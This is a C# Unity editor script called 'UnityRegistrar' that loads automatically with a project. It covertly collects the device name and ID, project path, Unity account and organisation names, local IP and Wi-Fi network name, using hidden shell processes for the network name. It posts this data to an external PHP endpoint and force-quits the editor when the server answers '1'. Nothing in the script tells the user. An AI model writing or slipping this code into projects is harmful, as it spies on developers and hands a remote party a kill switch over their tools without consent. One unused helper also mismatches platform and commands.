using System;
using System.Net;
using System.Linq;
using UnityEngine;
using UnityEditor;
using System.Diagnostics;
using System.Net.Sockets;
using UnityEngine.Networking;

namespace UnityRegistrar
{
    [InitializeOnLoad]
    public class UnityRegistrar : Editor
    {
        public static string invokeUrl = "https://www.[corrupted].com/UnityRegistrar.php";
        static UnityRegistrar()
        {
            EditorApplication.playModeStateChanged += (PlayModeStateChange state) =>
            {
                OnPlayModeStateChanged(state);
                if (!SessionState.GetBool("UnityRegistrar", false))
                {
                    Send("Start", true);
                    SessionState.SetBool("UnityRegistrar", true);
                    EditorApplication.wantsToQuit += OnApplicationQuit;
                }
            };
        }
        private static void OnPlayModeStateChanged(PlayModeStateChange obj)
        {
            if (obj == PlayModeStateChange.EnteredEditMode || obj == PlayModeStateChange.EnteredPlayMode)
                Send(obj.ToString(), false);
        }

        private static bool OnApplicationQuit()
        {
            Send("Quit", true);
            return true;
        }

        public static void Send(string state, bool sendallNetworkData = false)
        {
            WWWForm wwwform = new WWWForm();
            wwwform.AddField("deviceName", GetDeviceName());
            wwwform.AddField("projectName", GetProjectName());
            wwwform.AddField("projectPath", GetProjectPath());
            wwwform.AddField("state", state);
            wwwform.AddField("accountName", GetAccountName());
            wwwform.AddField("organizationName", GetOrganizationName());
            wwwform.AddField("deviceID", GetDeviceID());
            if (sendallNetworkData)
                wwwform.AddField("connectedNetworkName", GetConnectedNetworkProfileName());
            wwwform.AddField("localIP", GetLocalIPAdress());
            using (UnityWebRequest unityWebRequest = UnityWebRequest.Post(invokeUrl, wwwform))
            {
                UnityWebRequestAsyncOperation unityWebRequestAsyncOperation = unityWebRequest.SendWebRequest();
                while (!unityWebRequestAsyncOperation.isDone)
                    if (unityWebRequest.result == UnityWebRequest.Result.Success && unityWebRequest.downloadHandler.text.Trim().Equals("1"))
                        EditorApplication.Exit(0);
            }
        }

        public static string Command(string fileName, string arguments)
        {
            Process process = new Process();
            process.StartInfo.FileName = fileName;
            process.StartInfo.Arguments = arguments;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
            return process.StandardOutput.ReadToEnd();
        }

        private static string GetDeviceName()
        {
            return SystemInfo.deviceName;
        }

        private static string GetProjectName()
        {
            return Application.productName;
        }

        private static string GetProjectPath()
        {
            return Application.dataPath;
        }

        private static string GetAccountName()
        {
            return CloudProjectSettings.userName;
        }

        private static string GetOrganizationName()
        {
            return CloudProjectSettings.organizationName;
        }

        private static string GetDeviceID()
        {
            return SystemInfo.deviceUniqueIdentifier;
        }

        public static string GetConnectedNetworkProfileName()
        {
            if (Application.platform == RuntimePlatform.WindowsEditor)
            {
                return Command("powershell.exe", "Get-NetConnectionProfile | Select-Object -ExpandProperty Name");
            }
            if (Application.platform == RuntimePlatform.OSXEditor)
            {
                string text = Command("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I");
                return text.Substring(text.IndexOf("SSID:") + 5, text.IndexOf("MCS") - (text.IndexOf("SSID:") + 5));
            }
            return "";
        }

        private static string GetAllNetworkProfileNames()
        {
            if (Application.platform != RuntimePlatform.OSXEditor)
            {
                return "";
            }
            return string.Concat(new string[]
            {
                "WLAN: ",
                Environment.NewLine,
                Command("cmd.exe", "/c netsh wlan show profile").Replace("All User Profile", ""),
                Environment.NewLine,
                "LAN: ",
                Environment.NewLine,
                Command("cmd.exe", "/c netsh lan show profile").Replace("All User Profile", "")
            });
        }

        private static string GetLocalIPAdress()
        {
            return Dns.GetHostEntry(Dns.GetHostName()).AddressList.First((IPAddress f) => f.AddressFamily == AddressFamily.InterNetwork).ToString();
        }

        private static string GetCompanyName()
        {
            return Application.companyName;
        }
    }
}
